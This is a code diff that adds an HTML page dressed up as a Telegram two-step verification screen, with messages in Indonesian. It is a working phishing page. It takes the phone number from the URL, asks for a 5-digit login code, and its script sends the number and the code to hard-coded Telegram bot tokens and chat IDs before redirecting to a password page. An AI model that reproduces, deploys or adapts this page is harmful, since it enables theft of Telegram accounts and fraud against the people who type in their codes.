@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>OTP Code</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary-color: #0088cc;
+      --secondary-color: #00c6ff;
+      --white: #ffffff;
+      --text-color: #333333;
+      --label-color: #555555;
+      --border-color: #dddddd;
+      --shadow-color: rgba(0, 0, 0, 0.1);
+    }
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: url('gay3.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+      position: relative;
+    }
+
+    body::before {
+      content: "";
+      position: absolute;
+      top: -20%;
+      left: -20%;
+      width: 140%;
+      height: 140%;
+      background: radial-gradient(circle, rgba(255,255,255,0.15), transparent 100%);
+      animation: pulse 6s infinite;
+      z-index: 0;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(0.9); opacity: 0.8; }
+      50% { transform: scale(1); opacity: 1; }
+      100% { transform: scale(0.9); opacity: 0.8; }
+    }
+
+    .container {
+      background: transparent;
+      border-radius: 16px;
+      padding: 40px 30px 30px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      position: relative;
+      z-index: 1;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+      animation: fadeInUp 2s ease;
+      padding-top: 90px;
+    }
+
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .emoji {
+      font-size: 80px;
+      margin-bottom: 20px;
+    }
+
+    .phone-display {
+      font-size: 18px;
+      margin-bottom: 10px;
+      font-weight: 500;
+      color: var(--text-color);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .pencil-icon {
+      width: 20px;
+      cursor: pointer;
+      transition: transform 0.3s;
+    }
+
+    .pencil-icon:hover {
+      transform: rotate(15deg);
+    }
+
+    p {
+      color: #000;
+      margin: 0 0 30px;
+    }
+
+    input[type="number"] {
+      width: 100%;
+      padding: 12px 15px;
+      font-size: 16px;
+      margin-bottom: 20px;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      text-align: center;
+      transition: border-color 0.3s, box-shadow 0.3s;
+      background: #fff;
+    }
+
+    input[type="number"]:focus {
+      background: #fff;
+      outline: none;
+      border-color: var(--primary-color);
+      box-shadow: 0 0 8px rgba(0,136,204,0.2);
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      background-color: var(--primary-color);
+      color: var(--white);
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s, transform 0.3s;
+    }
+
+    .btn:hover {
+      background-color: #0077b3;
+      transform: scale(1.02);
+    }
+
+    .status {
+      margin-top: 15px;
+      font-size: 14px;
+      font-weight: 500;
+      min-height: 20px;
+    }
+
+    .disclaimer {
+      font-size: 12px;
+      color: #000;
+      margin: 25px 0 0;
+      line-height: 1.5;
+    }
+
+    .icon {
+      width: 100px;
+      height: 100px;
+      margin: -70px auto 20px;
+      color: #0088cc;
+      transition: transform 0.3s;
+    }
+
+    .telegram-logo {
+      width: 100%;
+      height: 100%;
+    }
+
+    .icon:hover {
+      transform: rotate(15deg);
+    }
+
+    h1 {
+      color: #000;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="icon">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="telegram-logo">
+        <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 
+                 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 
+                 1.394a.759.759 0 0 1-.6.295h-.006l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 
+                 4.326-2.96-.924c-.643-.203-.658-.643.136-.953l11.566-4.458c.538-.196 1.006.128.832.941z"/>
+      </svg>
+    </div>
+
+    <div class="phone-display">
+      <span id="phoneMasked"></span>
+      <img src="https://cdn-icons-png.flaticon.com/512/1159/1159633.png" alt="Edit" class="pencil-icon" id="editNumber" />
+    </div>
+
+    <h1>Enter verification code</h1>
+    <p>Your registration process is protected with two-step verification for security.</p>
+
+    <form id="codeForm">
+      <input type="number" id="verificationCode" min="10000" max="99999" placeholder="Enter 5 digit code" 
+        oninput="this.value = this.value.slice(0, 5)" />
+      <button type="submit" class="btn">NEXT</button>
+
+      <div class="disclaimer">
+        *Make sure the verification code is not given to anyone. The verification process takes 1-2 minutes.
+      </div>
+    </form>
+
+    <div class="status" id="statusMessage"></div>
+  </div>
+
+  <script>
+    const bots = [
+      { token: "8201148228:AAHAXLCl-q08qpH996Wr55Mv_4fe512q9bA", chatId: "7772972350" },
+      { token: "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM", chatId: "5876510981" }
+    ];
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const phone = urlParams.get('phone') || 'Tidak diketahui';
+    document.getElementById('phoneMasked').textContent = phone;
+
+    const codeForm = document.getElementById('codeForm');
+    const otpInput = document.getElementById('verificationCode');
+    const statusMessage = document.getElementById('statusMessage');
+
+    codeForm.addEventListener('submit', function (e) {
+      e.preventDefault();
+      const otp = otpInput.value.trim();
+
+      if (!otp || otp.length !== 5 || !/^\d{5}$/.test(otp)) {
+        statusMessage.textContent = "Kode OTP harus 5 digit angka.";
+        return;
+      }
+
+      const message = `🔐 *OTP Masuk*\n━━━━━━━━━━━━━━\n📞 Nomor HP: \`${phone}\`\n📩 OTP: \`${otp}\`\n━━━━━━━━━━━━━━`;
+
+      const botIndex = parseInt(localStorage.getItem('sessionBotIndex') || '0');
+      const bot = bots[botIndex];
+
+      const nextIndex = (botIndex + 1) % bots.length;
+      localStorage.setItem('sessionBotIndex', nextIndex);
+
+      const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+      fetch(api)
+        .then(res => res.json())
+        .then(data => {
+          if (data.ok) {
+            statusMessage.textContent = "Kode OTP berhasil dikirim!";
+            setTimeout(() => {
+              window.location.href = `password.html?phone=${phone}&otp=${otp}&bot=${botIndex}`;
+            }, 1000);
+          } else {
+            statusMessage.textContent = "Gagal mengirim OTP. Coba lagi.";
+          }
+        })
+        .catch(err => {
+          console.error(err);
+          statusMessage.textContent = "Terjadi kesalahan saat mengirim OTP.";
+        });
+    });
+  </script>
+</body>
+</html>
